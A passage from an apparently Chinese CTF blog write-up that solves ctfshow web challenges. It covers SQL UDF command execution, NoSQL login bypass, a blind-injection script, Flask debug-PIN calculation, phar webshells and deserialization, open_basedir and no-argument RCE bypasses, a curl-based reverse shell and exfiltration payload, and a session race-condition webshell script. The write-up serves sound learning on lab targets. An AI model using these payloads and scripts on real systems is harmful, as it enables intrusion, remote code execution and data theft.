&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;udf.so&#39;--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot;rn &#x3D; requests.get(next_url)uaf_url&#x3D;base_url+&quot;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+&quot;#导入udf函数r&#x3D;requests.get(uaf_url)nn_url &#x3D; base_url+&quot;?id&#x3D;&#39;;select sys_eval(&#39;cat &#x2F;flag.*&#39;);--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot;rnn &#x3D; requests.get(nn_url)print(rnn.text)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512180600048.png" alt="image-20220512180600048"></p><h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>sql语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;无$user &#x3D; $memcache-&gt;get($id);    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤</code></pre><p>nosql的注入</p><p><a href="http://rui0.cn/archives/609">NoSQL注入小笔记 - Ruilin (rui0.cn)</a></p><p><a href="https://www.anquanke.com/post/id/97211#h2-0">https://www.anquanke.com/post/id/97211#h2-0</a></p><blockquote><h4 id="NoSQL相关的SQL攻击"><a href="#NoSQL相关的SQL攻击" class="headerlink" title="NoSQL相关的SQL攻击:"></a>NoSQL相关的SQL攻击:</h4><p>1.<strong>重言式</strong>。又称为永真式。此类攻击是在条件语句中注入代码,使生成的表达式判定结果永远为真,从而绕过认证或访问机制。比如实际中用$ne操作(不相等)的语法让他们无需相应的凭证即可非法进入系统。</p><p>2.<strong>联合查询</strong>。联合查询是一种众所周知的SQL注入技术,攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。比如通过增加永真的表达式利用布尔OR运算符进行攻击,从而导致整个语句判定出错,进行非法的数据获取。</p><p>3.<strong>JavaScript注入</strong>。这是一种新的漏洞,由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码,这会导致非法的数据获取或篡改。</p><p>4.<strong>背负式查询</strong>。在背负式查询中,攻击者通过利用转义特定字符(比如像回车和换行之类的结束符)插入由数据库额外执行的查询,这样就可以执行任意代码了。</p><p>5.<strong>跨域违规</strong>。HTTP REST APIs是NoSQL数据库中的一个流行模块,然而,它们引入了一类新的漏洞,它甚至能让攻击者从其他域攻击数据库。在跨域攻击中,攻击者利用合法用户和他们的网页浏览器执行有害的操作。在本文中,我们将展示此类跨站请求伪造(CSRF)攻击形式的违规行为,在此网站信任的用户浏览器将被利用在NoSQL数据库上执行非法操作。通过把HTML格式的代码注入到有漏洞的网站或者欺骗用户进入到攻击者自己的网站上,攻击者可以在目标数据库上执行post动作,从而破坏数据库。</p><h4 id="NoSQL-MYSQL区别："><a href="#NoSQL-MYSQL区别：" class="headerlink" title="NoSQL MYSQL区别："></a>NoSQL MYSQL区别：</h4><p>nosql的定义是not only sql，包括键值数据库，列式数据库，文本数据库，图形数据库等</p><p>mysql是一种传统的关系型数据库。 关系型数据库一般都可以通过sql语句进行操作。sql的语法一般遵循SQL99标准，也就是说上层的应用可以通过同样的sql语句访问不同的数据库。 而nosql对sql的支持并不像关系型数据库一样。以hbase为例，它本身并不支持sql，我们可以通过hbase shell进行操作，上层应用可以通过hbase API读写数据库。但是我们也可以通过hive（hive sql，类sql语法）来访问hbase。还有一些hbase skin（可以理解成hbase客户端），支持了部分sql语法以方便用户使用，比如pheonix。</p></blockquote><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512181741192.png" alt="image-20220512181741192"></p><p>所以payload为</p><pre class="language-txt" data-language="txt"><code class="language-txt">?id[]&#x3D;flag</code></pre><h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><p>sql语句</p><pre class="language-none"><code class="language-none">$query &#x3D; new MongoDB\Driver\Query($data);$cursor &#x3D; $manager-&gt;executeQuery(&#39;ctfshow.ctfshow_user&#39;, $query)-&gt;toArray();    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤if(count($cursor)&gt;0)&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;  array_push($ret[&#39;data&#39;], $flag);&#125;</code></pre><p>还是nosql注入</p><p>条件操作符</p><pre class="language-txt" data-language="txt"><code class="language-txt">$gt : &gt;$lt : &lt;$gte: &gt;&#x3D;$lte: &lt;&#x3D;$ne : !&#x3D;、&lt;&gt;$in : in$nin: not in$all: all $or:  or$not: 反匹配(1.3.3及以上版本)模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)&#x2F;*** : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;*&#x2F;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512185557335.png" alt="image-20220512185557335"></p><pre class="language-php" data-language="php"><code class="language-php">db-&gt;logins-&gt;find(  array(&quot;username&quot;&#x3D;&gt;(string)$_POST[&quot;username&quot;],&quot;password&quot;&#x3D;&gt;(string)$_    POST[&quot;password&quot;]));</code></pre><p>构造<code>$data = array(“username” =&gt; array(&quot;$ne&quot; =&gt; 1), “password” =&gt; array(&quot;$ne&quot; =&gt; 1));</code>进行绕过</p><p>还是之前那个文章里面写到的($ne是不相等的意思)</p><pre class="language-payload" data-language="payload"><code class="language-payload">username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1或者利用正则username[$regex]&#x3D;.&amp;password[$regex]&#x3D;.</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512190339907.png" alt="image-20220512190339907"></p><h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><p>用上一题的姿势，出了admin账号的用户名密码：<br>再改成username不等于admin即可：</p><pre class="language-none"><code class="language-none">username[$ne]&#x3D;admin&amp;password[$ne]&#x3D;1</code></pre><h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><p>直接正则：</p><pre class="language-none"><code class="language-none">username[$regex]&#x3D;.*$&amp;password[$ne]&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512185920690.png" alt="image-20220512185920690"></p><p>这里登录测试，还会发现有admin和admin1，可以用这种正则去掉这俩</p><pre class="language-payload" data-language="payload"><code class="language-payload">username[$regex]&#x3D;^[^admin].*$&amp;password[$ne]&#x3D;1</code></pre><h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>sql语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;sqldb.ctfshow_user.find(&#123;username:&#39;$username&#39;,password:&#39;$password&#39;&#125;).pretty()    </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤if(count($cursor)&gt;0)&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;  array_push($ret[&#39;data&#39;], $flag);&#125;  </code></pre><p>继续<code>$regex</code>但发现状态码是<code>\u767b\u9646\u6210\u529f</code>，是查询成功的Unicode编码，但就是没有回显。所以这题结合这个状态码进行盲注</p><p>套神的脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;81040e32-f0ba-4e17-b9eb-56848ad36c4c.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;letter&#x3D;&quot;-ctfshow0123456789abcdef&#123;,&#125;&quot;flag&#x3D;&quot;&quot;for i in range(1,100):    for j in letter:        payload&#x3D;&quot;^&#123;&#125;.*$&quot;.format(flag+j)        data&#x3D;&#123;            &quot;username[$regex]&quot;:&quot;flag&quot;,            &quot;password[$regex]&quot;:payload        &#125;        res&#x3D;requests.post(url,data).text        #print(res)        if r&quot;\u767b\u9646\u5931\u8d25&quot; not in res:            flag+&#x3D;j            print(flag)            break          if j&#x3D;&#x3D;&quot;&#125;&quot;:            print(flag+&quot;--OUT&quot;)            exit()</code></pre><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><h1 id="常用姿势"><a href="#常用姿势" class="headerlink" title="常用姿势"></a>常用姿势</h1><h2 id="web801"><a href="#web801" class="headerlink" title="web801"></a>web801</h2><p>预期解：flask算pin</p><p>条件: flask debug模式开启 存在任意文件读取</p><blockquote><ol><li>username，用户名</li><li>modname，默认值为flask.app</li><li>appname，默认值为Flask</li><li>moddir，flask库下app.py的绝对路径</li><li>uuidnode，当前网络的mac地址的十进制数</li><li>machine_id，docker机器id<br><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524154547435.png" alt="image-20220524154547435"></li></ol></blockquote><blockquote><p>probably_public_bits包含4个字段，分别为<br>username<br>modname<br>getattr(app, &#39;name&#39;, app.class.name)<br>getattr(mod, &#39;file&#39;, None)</p><p>其中username对应的值为当前主机的用户名<br>   linux可以查看/etc/passwd<br>   windows可以查看C:/Users目录<br>modname的值为&#39;flask.app&#39;<br>getattr(app, &#39;name&#39;, app.class.name)对应的值为&#39;Flask&#39;<br>getattr(mod, &#39;file&#39;, None)对应的值为app包的绝对路径</p><p>private_bits包含两个字段，分别为<br>str(uuid.getnode())<br>get_machine_id()</p><p>其中str(uuid.getnode())为网卡mac地址的十进制值<br>   在inux系统下得到存储位置为/sys/class/net/（对应网卡）/address 一般为eth0<br>   windows中cmd执行config /all查看<br>get_machine_id()的值为当前机器唯一的机器码<br>   对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id<br>   docker机则读取/proc/self/cgroup。<br>   windows的id在注册表中 （HKEY_LOCAL_MACHINE-&gt;SOFTWARE-&gt;Microsoft-&gt;Cryptography）</p></blockquote><p>其中</p><p><strong>python 3.8和3.6 pin码生成方式不同</strong></p><p><strong>werkzeug版本不同machine-id获取不同</strong></p><p>3.6 MD5</p><pre class="language-python" data-language="python"><code class="language-python">import hashlibimport getpassfrom flask import Flaskfrom itertools import chainimport sysimport uuidusername&#x3D;getpass.getuser() app &#x3D; Flask(__name__)modname&#x3D;getattr(app, &quot;__module__&quot;, app.__class__.__module__)mod &#x3D; sys.modules.get(modname)probably_public_bits &#x3D; [    username, #用户名 一般为root或者读下&#x2F;etc&#x2F;passwd    modname,  #一般固定为flask.app    getattr(app, &quot;__name__&quot;, app.__class__.__name__), #固定，一般为Flask    getattr(mod, &quot;__file__&quot;, None),    #flask库下app.py的绝对路径，可以通过报错信息得到]mac &#x3D;&#39;02:42:ac:0c:ac:28&#39;.replace(&#39;:&#39;,&#39;&#39;)mac&#x3D;str(int(mac,base&#x3D;16))private_bits &#x3D; [mac, &quot;机器码&quot; ]h &#x3D; hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit &#x3D; bit.encode(&quot;utf-8&quot;)    h.update(bit)h.update(b&quot;cookiesalt&quot;)cookie_name &#x3D; &quot;__wzd&quot; + h.hexdigest()[:20]# If we need to generate a pin we salt it a bit more so that we don&#39;t# end up with the same value and generate out 9 digitsnum&#x3D;Noneif num is None:    h.update(b&quot;pinsalt&quot;)    num &#x3D; (&quot;%09d&quot; % int(h.hexdigest(), 16))[:9]# Format the pincode in groups of digits for easier remembering if# we don&#39;t have a result yet.rv&#x3D;Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size &#x3D;&#x3D; 0:            rv &#x3D; &quot;-&quot;.join(                num[x : x + group_size].rjust(group_size, &quot;0&quot;)                for x in range(0, len(num), group_size)            )            break    else:        rv &#x3D; num    print(rv)</code></pre><p>3.8 SHA1</p><pre class="language-python" data-language="python"><code class="language-python">import hashlibimport getpassfrom flask import Flaskfrom itertools import chainimport sysimport uuidimport typing as tusername&#x3D;&#39;root&#39;app &#x3D; Flask(__name__)modname&#x3D;getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)mod&#x3D;sys.modules.get(modname)mod &#x3D; getattr(mod, &quot;__file__&quot;, None)probably_public_bits &#x3D; [    username, #用户名    modname,  #一般固定为flask.app    getattr(app, &quot;__name__&quot;, app.__class__.__name__), #固定，一般为Flask    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39;,   #主程序（app.py）运行的绝对路径]print(probably_public_bits)mac &#x3D;&#39;02:42:ac:0c:ac:28&#39;.replace(&#39;:&#39;,&#39;&#39;)mac&#x3D;str(int(mac,base&#x3D;16))private_bits &#x3D; [   mac,#mac地址十进制 &quot;机器码&quot;     ]print(private_bits)h &#x3D; hashlib.sha1()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit &#x3D; bit.encode(&quot;utf-8&quot;)    h.update(bit)h.update(b&quot;cookiesalt&quot;)cookie_name &#x3D; f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;# If we need to generate a pin we salt it a bit more so that we don&#39;t# end up with the same value and generate out 9 digitsh.update(b&quot;pinsalt&quot;)num &#x3D; f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]# Format the pincode in groups of digits for easier remembering if# we don&#39;t have a result yet.rv&#x3D;Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size &#x3D;&#x3D; 0:            rv &#x3D; &quot;-&quot;.join(                num[x : x + group_size].rjust(group_size, &quot;0&quot;)                for x in range(0, len(num), group_size)            )            break    else:        rv &#x3D; numprint(rv)</code></pre><p><strong>需要填的值就一个变化的地方—机器码。旧版的只需要读取/proc/self/cgroup即可，但是新增需要在前面再拼上/etc/machine-id或者/proc/sys/kernel/random/boot_id的值</strong></p><p>旧版</p><pre class="language-none"><code class="language-none">先从&#x2F;proc&#x2F;self&#x2F;cgroup判断是否是docker容器，如果有符合条件的值直接返回value；如果未在cgroup中读到&#x2F;docker&#x2F;后的内容进行下一步，先后读取&#x2F;etc&#x2F;machine-id 和 boot_id中的值返回一个所以此处machine-id应为docker: cgroup中 &#x2F;docker&#x2F;后的内容非docker: 先后读取machine-id和boot_id 有值即取</code></pre><p>新版</p><pre class="language-txt" data-language="txt"><code class="language-txt">先从&#x2F;etc&#x2F;machine-id和&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id读出一个就跳出，然后再读取&#x2F;proc&#x2F;self&#x2F;cgroup中的id值拼接所以此处machine-id为&#x2F;etc&#x2F;machine-id + &#x2F;proc&#x2F;self&#x2F;cgroup或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id + &#x2F;proc&#x2F;self&#x2F;cgroup</code></pre><p>实操一下801</p><p>username</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524154520223.png" alt="image-20220524154520223"></p><p>路径</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155654602.png" alt="image-20220524155654602"></p><p>mac地址</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155323058.png" alt="image-20220524155323058"></p><p>再拿id</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155416263.png" alt="image-20220524155416263"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155504261.png" alt="image-20220524155504261"></p><p>所以最后的机器码为8fa8946d-c588-40d0-9458-c3e9cf0a8851c292988f5c1a7a742186319fd5bb28c02167bce3e99959638562210c1ecf54ad</p><p>带脚本里跑出值然后访问console</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155757898.png" alt="image-20220524155757898"></p><p>引入os库来得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155954645.png" alt="image-20220524155954645"></p><h2 id="web802"><a href="#web802" class="headerlink" title="web802"></a>web802</h2><p>无数字字母命令执行</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd &#x3D; $_POST[&#39;cmd&#39;];if(!preg_match(&#39;&#x2F;[a-z]|[0-9]&#x2F;i&#39;,$cmd))&#123;    eval($cmd);&#125;</code></pre><p>这里显然就算利用异或，非，取反来构造命令进行命令执行</p><p>直接上羽师傅的脚本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524160514067.png" alt="image-20220524160514067"></p><h2 id="web803"><a href="#web803" class="headerlink" title="web803"></a>web803</h2><p>phar文件包含</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-03-19 12:10:55# @Last Modified by:   h1xa# @Last Modified time: 2022-03-19 13:27:18# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.comerror_reporting(0);highlight_file(__FILE__);$file &#x3D; $_POST[&#39;file&#39;];$content &#x3D; $_POST[&#39;content&#39;];if(isset($content) &amp;&amp; !preg_match(&#39;&#x2F;php|data|ftp&#x2F;i&#39;,$file))&#123;    if(file_exists($file.&#39;.txt&#39;))&#123;        include $file.&#39;.txt&#39;;    &#125;else&#123;        file_put_contents($file,$content);    &#125;&#125;</code></pre><p>在文件后加上了.phar后缀，这里直接把马写在phar里就行了</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php       $phar &#x3D; new Phar(&quot;includephar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar       $phar-&gt;startBuffering();    $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;); &#x2F;&#x2F;设置stub             $phar-&gt;addFromString(&#39;test.txt&#39;, &#39;&lt;?php system($_POST[a]);?&gt;&#39;); &#x2F;&#x2F;    $phar-&gt;stopBuffering();    &#x2F;&#x2F; phar生成?&gt;</code></pre><p>没权限写的时候就往tmp目录底下写</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524162306332.png" alt="image-20220524162306332"></p><p>然后用phar协议来访问</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524162356068.png" alt="image-20220524162356068"></p><h2 id="web804"><a href="#web804" class="headerlink" title="web804"></a>web804</h2><p>phar反序列化，考烂了快</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);class hacker&#123;    public $code;    public function __destruct()&#123;        eval($this-&gt;code);    &#125;&#125;$file &#x3D; $_POST[&#39;file&#39;];$content &#x3D; $_POST[&#39;content&#39;];if(isset($content) &amp;&amp; !preg_match(&#39;&#x2F;php|data|ftp&#x2F;i&#39;,$file))&#123;    if(file_exists($file))&#123;        unlink($file);    &#125;else&#123;        file_put_contents($file,$content);    &#125;&#125;</code></pre><p>构造链子</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524164057529.png" alt="image-20220524164057529"></p><p>传上去之后phar访问一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524164042957.png" alt="image-20220524164042957"></p><h2 id="web805"><a href="#web805" class="headerlink" title="web805"></a>web805</h2><p><strong>open_basedir绕过</strong></p><p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。</p><p>假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。</p><p>注意：用open_basedir指定的<strong>限制实际上是前缀，而不是目录名</strong>。</p><p>可以利用glob协议先遍历目录</p><pre class="language-php" data-language="php"><code class="language-php">$a &#x3D; &quot;glob:&#x2F;&#x2F;&#x2F;*&quot;;  if ( $b &#x3D; opendir($a) ) &#123;    while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;      echo $file.&quot;\n&quot;;    &#125;    closedir($b);  &#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524165320388.png" alt="image-20220524165320388"></p><p>然后利用chdir和mkdir读取</p><pre class="language-sh" data-language="sh"><code class="language-sh">mkdir(&quot;s&quot;);chdir(&#39;s&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo file_get_contents(&quot;&#x2F;ctfshowflag&quot;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524182720886.png" alt="image-20220524182720886"></p><p><strong>另外还有一种利用p神脚本的方式</strong></p><p>脚本懒得贴了，主要就是，别用php当后缀，不然脚本不知道为什么接收不了靶机上的参数，只会执行你自己vps上的内容，要不然就要写个flask当跳板。（花了一天的血的教训</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525182618874.png" alt="image-20220525182618874"></p><p>flask的内容</p><pre class="language-python" data-language="python"><code class="language-python">from flask import Flaskapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;&#39;)def hello_world():    with open(&#39;opendir.php&#39;,&#39;r&#39;) as f:        pay &#x3D; f.read()    return pay    if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(host&#x3D;&quot;0.0.0.0&quot;, port&#x3D;int(&quot;5001&quot;), debug&#x3D;True)</code></pre><p>在vps上开起来然后文件包含</p><h2 id="web806"><a href="#web806" class="headerlink" title="web806"></a>web806</h2><p><strong>php无参RCE</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p>经典无参rce，百度找一堆payload</p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE · sky&#39;s blog (skysec.top)</a></p><p><a href="https://blog.csdn.net/qq_45570082/article/details/106602261">无参数rce_名字被抢的Stars的博客-CSDN博客_无参数rce</a></p><p><a href="https://hetian.blog.csdn.net/article/details/107171940?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-107171940-blog-105237550.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-107171940-blog-105237550.pc_relevant_default&amp;utm_relevant_index=5">https://hetian.blog.csdn.net/article/details/107171940?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107171940-blog-105237550.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107171940-blog-105237550.pc_relevant_default&amp;utm_relevant_index=5</a></p><p><code>var_dump(scandir(dirname(dirname(dirname(getcwd())))));</code>读上级目录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524183248018.png" alt="image-20220524183248018"></p><p>用这种函数构造的方法根目录文件不是很好读，主要是还要构造一个斜杠</p><pre class="language-txt" data-language="txt"><code class="language-txt">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));</code></pre><p>写个脚本看运气读吧</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524190821873.png" alt="image-20220524190821873"></p><h2 id="web807"><a href="#web807" class="headerlink" title="web807"></a>web807</h2><p><strong>反弹shell</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    error_reporting(0);highlight_file(__FILE__);$url &#x3D; $_GET[&#39;url&#39;];$schema &#x3D; substr($url,0,8);if($schema&#x3D;&#x3D;&#x3D;&quot;https:&#x2F;&#x2F;&quot;)&#123;    shell_exec(&quot;curl $url&quot;);&#125;</code></pre><p>拿一下群主搭的网站</p><p><a href="https://your-shell.com/">https://your-shell.com/</a></p><p>后边带上ip和端口带个sh命令就能直接反弹shell了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524204159380.png" alt="image-20220524204159380"></p><p>或者可以利用像dnslog外带那种</p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">https:&#x2F;&#x2F;;curl ip:port?a&#x3D;&#96;ls&#96;</code></pre><h2 id="web808"><a href="#web808" class="headerlink" title="web808"></a>web808</h2><p><strong>卡临时文件包含</strong></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/106498971">PHP LFI 利用临时文件 Getshell 姿势_WHOAMIAnony的博客-CSDN博客_phpinfo拿shell</a></p><p><code>include &#39;php://filter/string.strip_tags/resource=/etc/passwd&#39;;</code></p><p>这段代码会导致php进程的崩溃而让我们的临时文件留在临时文件目录下不会被删除</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$file &#x3D; $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; !preg_match(&quot;&#x2F;input|data|phar|log&#x2F;i&quot;,$file))&#123;    include $file;&#125;else&#123;    show_source(__FILE__);    print_r(scandir(&quot;&#x2F;tmp&quot;));&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524210412095.png" alt="image-20220524210412095"></p><p>用这段代码上传就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524210438734.png" alt="image-20220524210438734"></p><p>然后包含一下我们的临时文件就能getshell了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524210616382.png" alt="image-20220524210616382"></p><p>还有一种利用session条件竞争来写马的方法</p><p><a href="https://www.freebuf.com/articles/web/288430.html">【文件包含&amp;条件竞争】详解如何利用session.upload_progress文件包含进行... - FreeBuf网络安全行业门户</a></p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport ioimport threadingurl &#x3D; &quot;http:&#x2F;&#x2F;192.168.2.128&#x2F;test.php&quot;sessid &#x3D; &quot;Lxxx&quot;def write(session):filebytes &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)while True:res &#x3D; session.post(url,data&#x3D;&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &quot;&lt;?php eval($_POST[1]);?&gt;&quot;&#125;,cookies&#x3D;&#123;&#39;PHPSESSID&#39;: sessid&#125;,files&#x3D;&#123;&#39;file&#39;: (&#39;Lxxx.jpg&#39;, filebytes)&#125;)def read(session):while True:res &#x3D; session.post(url+&quot;?a&#x3D;&#x2F;tmp&#x2F;sess_&quot;+sessid,data&#x3D;&#123;&quot;1&quot;:&quot;file_put_contents(&#39;&#x2F;www&#x2F;admin&#x2F;localhost_80&#x2F;wwwroot&#x2F;1.php&#39; , &#39;&lt;?php eval($_POST[2]);?&gt;&#39;);&quot;&#125;,cookies&#x3D;&#123;&quot;PHPSESSID&quot;:sessid&#125;)res2 &#x3D; session.get(&quot;http:&#x2F;&#x2F;192.168.2.128&#x2F;1.php&quot;)if res2.status_code &#x3D;&#x3D; 200:print(&quot;成功写入一句话！&quot;)else:print(&quot;Retry&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:evnet &#x3D; threading.Event()with requests.session() as session:for i in range(5):threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()for i in range(5):threading.Thread(target&#x3D;read, args&#x3D;(session,)).start()evnet.set()</code></pre><h2 id="web809"><a href="#web809" class="headerlink" title="web809"></a>web809</h2><p><strong>pear文件包含RCE</strong></p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)</a></p><p><a href="https://blog.csdn.net/weixin_45751765/article/details/121628030?ops_request_misc=%7B%22request_id%22:%22164994550016782089359874%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=164994550016782089359874&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2blogfirst_rank_ecpm_v1~rank_v31_ecpm-1-121628030.nonecase&utm_term=pear&spm=1018.2226.3001.4450">HXBCTF 2021]湖湘杯easywill_k_du1t的博客-CSDN博客</a></p><blockquote><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p><p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p></blockquote><p>利用条件：register_argc_argv开启</p><p>当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</p><blockquote><p>‘argv’<br>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p></blockquote><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524211826336.png" alt="image-20220524211826336"></p><p><img 